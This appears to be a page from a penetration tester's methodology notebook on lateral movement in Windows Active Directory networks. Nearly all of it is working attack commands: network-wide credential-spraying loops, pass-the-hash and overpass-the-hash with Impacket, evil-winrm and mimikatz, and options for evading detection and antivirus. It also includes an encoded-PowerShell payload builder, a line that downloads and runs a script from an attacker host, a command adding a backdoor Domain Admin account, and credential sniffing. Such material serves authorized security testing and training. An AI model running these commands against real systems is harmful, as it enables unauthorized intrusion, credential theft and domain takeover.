# Lateral Movement

Lateral movement turns credentials from one host into execution on another. This is how a single foothold can become domain-wide compromise: land on a workstation, [dump credentials](credential-dumping.md), validate them against authorized targets, and move toward systems that demonstrate the highest impact. Every hop is a finding; record the source credential, target, and access gained.

{% hint style="warning" %}
The single most important habit on the internal: **spray every credential the moment you get it**. One reused local-admin password or hash across a subnet is the most common path to Domain Admin. See [Credential Spray Protocol](#credential-spray-protocol) below.
{% endhint %}

## Decision tree — how do I move?

```
Valid credentials acquired (password or hash)
    │
    ├── WinRM open (5985/5986)?  → evil-winrm -i <TARGET> -u USER -p 'PASS'  (or -H hash)
    │
    ├── SMB open (445)?          → nxc smb <TARGET> -u USER -p 'PASS'  → look for "Pwn3d!"
    │        ├─ admin  → impacket-psexec (SYSTEM shell)
    │        └─ no admin → enumerate shares: nxc smb <TARGET> --shares
    │
    ├── SSH open (22)?           → ssh USER@<TARGET>   (or key)
    │
    ├── MSSQL open (1433)?       → impacket-mssqlclient DOMAIN/USER:PASS@<TARGET> -windows-auth
    │        └─ sysadmin → enable xp_cmdshell → RCE
    │
    ├── RDP open (3389)?         → xfreerdp /v:<TARGET> /u:USER /p:'PASS'
    │
    ├── NTLM blocked?            → Kerberos: getTGT → export KRB5CCNAME → tool -k -no-pass
    │
    ├── Target only reachable from ANOTHER host?
    │        ├─ Windows→Windows: Invoke-Command -ComputerName ... -Credential $cred
    │        ├─ Linux→Linux:     ssh -J PIVOT_USER@PIVOT TARGET_USER@TARGET
    │        └─ Or tunnel with Ligolo-ng (see Pivoting & Tunneling)
    │
    └── No obvious path?  → check ACL abuse (GenericWrite), credential reuse, enumerate harder
```

## Credential Spray Protocol

**Mandatory** every time you acquire a new credential — password or hash:

```bash
# 1. Against all SMB hosts on the current subnet
nxc smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --continue-on-success

# 2. Against WinRM hosts
nxc winrm <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# 3. Other subnets you can reach
nxc smb <OTHER_SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --continue-on-success

# 4. Trusted / sibling domains
nxc smb <OTHER_SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <OTHER_DOMAIN>

# 5. Password reuse across common usernames
for user in admin administrator root system service guest; do
  nxc smb <SUBNET>/24 -u "$user" -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
done

# 6. Log results for later
nxc smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --continue-on-success > spray.log
```

Pass a hash instead of a password with `-H <NThash>` (add `--local-auth` for local accounts). Credential reuse is rampant — one password often works across multiple usernames, machines, services, and even domains.

{% hint style="info" %}
`Pwn3d!` in NetExec output means that credential is **local admin** on that host — your green light for `impacket-psexec` and a SYSTEM shell. Without it, you can still read shares and enumerate.
{% endhint %}

## Tools & protocols at a glance

| Tool | Ports | Protocol | Admin | Stealth |
| --- | --- | --- | --- | --- |
| psexec.py | 445 | SMB | Yes | Medium (drops a service) |
| wmiexec.py | 135, 445 | WMI/RPC | Yes | High (no binary dropped) |
| smbexec.py | 445 | SMB | No\* | Low |
| atexec.py | 445 | Task Scheduler | No\* | Medium |
| dcomexec.py | 135, 445, 49xxx | DCOM | No\* | Medium |
| evil-winrm | 5985/5986 | WinRM | — | Medium |
| xfreerdp | 3389 | RDP | — | Low (interactive) |
| ssh | 22 | SSH | — | High |

\* Admin not strictly required but strongly preferred.

## Impacket exec suite

The Linux-side workhorses. All accept `-hashes <LM>:<NT>` (or `:<NT>`) for pass-the-hash.

```bash
psexec.py DOMAIN/user:password@<TARGET>                    # SYSTEM shell via SMB (noisy)
wmiexec.py DOMAIN/user:password@<TARGET>                   # WMI, quieter, semi-interactive
smbexec.py DOMAIN/user:password@<TARGET>                   # no binary dropped
atexec.py DOMAIN/user:password@<TARGET> "whoami"           # scheduled-task, one command
dcomexec.py DOMAIN/user:password@<TARGET>                  # DCOM RCE

# Hash auth
psexec.py -hashes :<NT_HASH> DOMAIN/user@<TARGET>

# Evade detection: custom service name / non-default share
psexec.py DOMAIN/user:pass@<TARGET> -service-name customname -remote-binary-name custom.exe
wmiexec.py DOMAIN/user:pass@<TARGET> -share SHARE
```

## Pass-the-Hash

Replay an NTLM hash without ever cracking it:

```bash
psexec.py -hashes <LM_HASH>:<NT_HASH> DOMAIN/USER@<TARGET>
nxc smb <TARGET> -u USER -H ":<NT_HASH>"
xfreerdp /v:<TARGET> /u:USER /d:DOMAIN /pth:<NTLM_HASH>              # restricted-admin RDP
pth-winexe -U 'DOMAIN/USER%<LM>:<NT>' //<TARGET> cmd.exe            # Linux PtH via winexe
```

## WinRM

```powershell
Test-WSMan -ComputerName <TARGET>          # is WinRM listening?
Enable-PSRemoting -Force                    # enable it (on a host you control)
```

```bash
evil-winrm -i <TARGET> -u USER -p PASSWORD
evil-winrm -i <TARGET> -u USER -H <NT_HASH>          # pass-the-hash
evil-winrm -i <TARGET> -u USER -p PASSWORD -r DOMAIN # kerberos realm

# In session
Bypass-4MSI
IEX([Net.Webclient]::new().DownloadString("http://<ATTACKER_IP>/script.ps1"))
```

## PowerShell Remoting

```powershell
# Build a credential object
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\User', $pass)

# One command
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }

# Many hosts
Invoke-Command -ComputerName DC01,CLIENT1 -Credential $cred -ScriptBlock { Get-Service }

# Script file
Invoke-Command -ComputerName DC01 -Credential $cred -FilePath C:\Scripts\Task.ps1

# Interactive session
$s = New-PSSession -ComputerName DC01 -Credential $cred
Enter-PSSession -Session $s
```

## Native Windows equivalents (when you can't drop Impacket)

Sometimes the foothold has PowerShell restricted or you don't want an obvious dropped tool. Windows ships every primitive natively.

**wmic** (deprecated in Win11 24H2, still in most builds):

```
wmic /node:<TARGET> /user:DOMAIN\USER /password:PASS process call create "calc.exe"
wmic /node:<TARGET> /user:USER /password:PASS process call create "powershell -enc <b64>"
wmic /node:<TARGET> /user:USER /password:PASS process list brief      # output-only
```

**PowerShell CIM over DCOM** — remote WMI without the Impacket wire signature:

```powershell
$opt = New-CimSessionOption -Protocol DCOM
$cred = Get-Credential
$s = New-CimSession -ComputerName <TARGET> -Credential $cred -SessionOption $opt
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "powershell -enc <b64>"}
Remove-CimSession $s
```

**winrs.exe** — remote command over WinRM, native:

```
winrs -r:<TARGET> -u:DOMAIN\USER -p:PASS "cmd /c whoami"
winrs -r:https://<TARGET>:5986 -u:DOMAIN\USER -p:PASS "powershell -enc <b64>"
```

Omit `-u`/`-p` and `winrs` uses the current Kerberos ticket — ideal for Pass-the-Ticket / Overpass-the-Hash chains.

**Sysinternals PsExec64.exe** — the signed original that impacket-psexec re-implements:

```
PsExec64.exe -accepteula \\<TARGET> -u DOMAIN\USER -p PASS -s -i cmd
#   -s run as SYSTEM   -i interactive   -d don't wait   -c copy binary   -r remote service name
```

The signed Sysinternals binary sometimes gets through where impacket's dropped binary trips AV.

Build the `-enc` base64 argument (`-enc` needs UTF-16LE + Base64):

```python
#!/usr/bin/env python3
import sys, base64
payload = sys.argv[1]
enc = base64.b64encode(payload.encode('utf-16-le')).decode()
print(f"powershell -nop -w hidden -enc {enc}")
```

## Kerberos when NTLM fails

Some hardened hosts block NTLM entirely. Kerberos is the fallback. Symptoms: `STATUS_NOT_SUPPORTED`, timeouts, "NTLM not available", or valid creds where PtH just fails.

```bash
# Step 1: /etc/hosts must map FQDN → correct IP
ping -c 1 <TARGET_FQDN>

# Step 2: get a TGT
impacket-getTGT DOMAIN/USER:'PASSWORD' -dc-ip <DC_IP>       # → USER.ccache
impacket-getTGT DOMAIN/USER -hashes :<NT_HASH> -dc-ip <DC_IP>   # overpass-the-hash

# Step 3: export the ticket
export KRB5CCNAME=USER.ccache

# Step 4: use it — FQDN required, not IP
evil-winrm -i <TARGET_FQDN> -r DOMAIN
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-secretsdump -k -no-pass <TARGET_FQDN>
impacket-mssqlclient -k -no-pass <TARGET_FQDN>
```

### /etc/krb5.conf for multiple domains

```ini
[libdefaults]
    default_realm = <PRIMARY_DOMAIN_UPPER>
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    <DOMAIN_UPPER> = {
        kdc = <DC_FQDN>
        admin_server = <DC_FQDN>
    }

[domain_realm]
    .<domain> = <DOMAIN_UPPER>
    <domain> = <DOMAIN_UPPER>
```

### Common Kerberos errors

| Error | Cause | Fix |
| --- | --- | --- |
| KDC did not return a TGT | Clock skew or wrong DC | `sudo ntpdate <DC>`, check /etc/hosts |
| NTLM_ERR_PARSE | FQDN wrong | Use FQDN not IP in evil-winrm |
| No credentials supplied | KRB5CCNAME not set | `export KRB5CCNAME=file.ccache` |

## Overpass-the-Hash (`sekurlsa::pth`) with klist verification

`sekurlsa::pth` injects an NT hash into a new LSASS logon session and spawns a process under it. That process gets Kerberos tickets automatically when it authenticates — no plaintext needed.

```
# 1. Admin mimikatz on the foothold
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<DOMAIN_ADMIN> /domain:<DOMAIN> /ntlm:<NT_HASH> /run:powershell
# A new PowerShell window opens as <DOMAIN_ADMIN> (still shows old username — normal)

# 2. In the new window, verify no tickets yet
PS> klist          # Cached Tickets: (0)

# 3. Trigger auth to request a TGT silently
PS> net use \\<DC>

# 4. Verify tickets landed
PS> klist          # now shows krbtgt + cifs/<DC>

# 5. Lateral-move from THIS window with any Kerberos-aware tool
PS> PsExec.exe \\<DC> cmd
PS> Enter-PSSession -ComputerName <DC>
```

{% hint style="danger" %}
**Hostname-vs-IP gotcha:** Kerberos SPNs are hostname-based (`cifs/dc01.corp.local`). Connect by **IP** and Windows falls back to NTLM, which the injected Kerberos identity doesn't satisfy — you get Access Denied. After any PtT / Golden / OtH, always target by hostname or FQDN. If DNS is broken, add a hosts entry first: `Add-Content C:\Windows\System32\drivers\etc\hosts "192.168.10.5 dc01.corp.local dc01"`.
{% endhint %}

## Pass-the-Ticket & Kerberos delegation

* **Pass-the-Ticket** — inject a `.kirbi` / ccache and reuse it. Details in [AD Attacks](ad-attacks.md).
* **Unconstrained delegation** — compromise a host with it, extract cached TGTs, reuse the DC's.
* **Constrained delegation** — a service account can impersonate to specific SPNs.
* **RBCD** — if you can write a target's `msDS-AllowedToActOnBehalfOfOtherIdentity`, mint tickets as any user.

```bash
getTGT.py domain/user -hashes :<NThash>
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain/user@<TARGET_FQDN>
```

## PSSession double-hop problem

Inside an evil-winrm / PSSession, your credentials aren't forwarded to a third machine — so `dir \\<TARGET>\c$` returns Access Denied. The fix is `Invoke-Command` with **explicit** credentials, which are sent fresh rather than passed through:

```powershell
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USER>", $password)

Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { whoami; hostname }
Invoke-Command -ComputerName <HOST1>,<HOST2> -Credential $cred -ScriptBlock { type C:\Users\*\Desktop\flag.txt }

# CredSSP variant (run on target first): Enable-WSManCredSSP -Role Server -Force
Invoke-Command -ComputerName <TARGET> -Credential $cred -Authentication Credssp -ScriptBlock { whoami }
```

Do **not** use `Enter-PSSession` inside evil-winrm — use `Invoke-Command`.

## RDP

```bash
xfreerdp /v:<TARGET> /u:'User' /p:'Password123!' /size:1366x768 +clipboard
xfreerdp /v:<TARGET> /u:User /pth:<NThash>              # restricted-admin PtH
rdesktop -u user -p password <TARGET> -g 70%
nxc rdp <TARGET> -u user -p pass --nla-screenshot        # screenshot the login
```

Enable RDP on a box you own, and fix the common CredSSP error:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

Anti-forensics: `mstsc /public /v:server01` prevents credential caching.

## Creating accounts on a box you own

```powershell
net user hacker Hacker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
net group "Domain Admins" hacker /add /domain
```

## Internal enumeration after a pivot

Once you're on the internal network (see [Pivoting & Tunneling](pivoting-tunneling.md)), map it and hunt relay targets:

```bash
./fscan -h <SUBNET>/24                                    # fast host/port/SMB-signing sweep
nxc smb <SUBNET>/24 --gen-relay-list relay_targets.txt    # hosts without SMB signing = relay candidates
tcpdump -i eth0 -A -l | grep -i "password\|auth\|pass="   # sniff cleartext creds
```

Hosts in `relay_targets.txt` (SMB signing not required — typically workstations, rarely DCs) are candidates for SMB relay attacks.

## Post-exploitation checklist

After each new host:

* **Enumerate** — users, groups, domain admins, LAPS, shares, sensitive files, installed software/patches
* **Harvest** — LSASS, SAM/SYSTEM, NTDS.dit, registry, DPAPI (see [Credential Dumping](credential-dumping.md))
* **Escalate** — `whoami /priv`, SUID/sudo (Linux), unquoted service paths / DLL hijack (Windows)
* **Spray** — every new credential across the network (mandatory)
* **Pivot** — identify new subnets, set up tunnels, reach critical systems

## Workflow

```
# 1. Get creds/hash on the first host (dump or crack)
# 2. SPRAY across the subnet with nxc smb → find "Pwn3d!"
# 3. On a Pwn3d! host: impacket-psexec / evil-winrm for a shell
# 4. Dump that host's creds → new material → spray again
# 5. NTLM blocked? switch to Kerberos (getTGT → -k -no-pass)
# 6. Repeat until you reach the DC → DCSync → Domain Admin
```

## Related

* [Credential Dumping](credential-dumping.md) — where the hashes and passwords you spray come from
* [AD Attacks](ad-attacks.md) — Kerberoast, AS-REP, Pass-the-Ticket, golden/silver tickets, delegation
* [Pivoting & Tunneling](pivoting-tunneling.md) — reach hosts you can't touch directly
* [Windows Privesc](windows-privesc-methodology.md) · [Linux Privesc](linux-privesc-methodology.md) — get admin on each hop
* [File Transfers](file-transfers.md) — stage tools and pull loot across the network
* [Shells & Payloads](shells-payloads.md) — the shell each hop lands you
* [Report Writing](report-writing.md) — each hop is a finding: source cred, target, access gained
